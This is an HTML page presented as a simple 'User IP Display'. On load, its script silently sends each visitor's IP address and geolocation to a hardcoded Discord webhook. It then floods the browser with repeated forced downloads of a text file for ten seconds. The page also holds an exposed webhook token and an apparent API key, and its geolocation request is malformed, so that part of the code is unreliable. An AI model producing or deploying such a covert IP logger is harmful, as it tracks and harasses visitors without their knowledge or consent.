<!DOCTYPE html>
<html>
<head>
    <title>User IP Display</title>
    <script>
        function getIP() {
            fetch('https://api.ipify.org/?format=json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    document.getElementById('ipDisplay').innerText = 'IP: ' + ip;
                    sendIPToWebhook(ip);
                    getGeolocation(ip);
                })
                .catch(error => {
                    console.log('Error:', error);
                });
        }

        function sendIPToWebhook(ip, country, region, city, areaCode) {
            const webhookUrl = 'https://discord.com/api/webhooks/1113688349878800445/lWt0rsk4cFH0uvbagEzKbGQUgJLF17bA3h4BqlfK9E8OizkwgWgzBhhYoVaBLaokSfOL'; // Replace with your Discord webhook URL
            const payload = {
                content: `IP: ${ip}\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nArea Code: ${areaCode}`
            };
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.ok) {
                    console.log('IP and geolocation sent to webhook successfully.');
                    downloadFile(ip); // Call the function to download the file after sending the IP
                } else {
                    console.log('Failed to send IP and geolocation to webhook.');
                }
            })
            .catch(error => {
                console.log('Error:', error);
            });
        }

        function getGeolocation(ip) {
            fetch(`https://api.ipify.org/api/v1/ip/geolocation?apiKey=at_1O06yaHPU3FysaMxjDdG4U59hgKJnip=${ip}`)
                .then(response => response.json())
                .then(data => {
                    const { country, region, city, area_code } = data;
                    sendIPToWebhook(ip, country, region, city, area_code);
                })
                .catch(error => {
                    console.log('Error:', error);
                });
        }

        function downloadFile(ip) {
            const filename = 'ip.txt';
            const content = 'IP: ' + ip;
            const element = document.createElement('a');
            element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(content));
            element.setAttribute('download', filename);
            element.style.display = 'none';
            document.body.appendChild(element);

            // Set an interval to repeatedly trigger the file download
            const intervalId = setInterval(() => {
                element.click();
            }, 100); // Adjust the interval (in milliseconds) to control the speed of spamming

            // Optional: Stop the spamming after a certain duration
            setTimeout(() => {
                clearInterval(intervalId);
            }, 10000); // Change the duration (in milliseconds) as needed

            // Optional: Remove the element after the spamming stops
            setTimeout(() => {
                document.body.removeChild(element);
            }, 11000); // Adjust the timing (in milliseconds) as needed
        }
    </script>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        h1 {
            margin-bottom: 20px;
        }
    </style>
</head>
<body onload="getIP()">
    <h1 id="ipDisplay">Loading...</h1>
    <p>:)))))):</p>

    <script>
    </script>
</body>
</html>
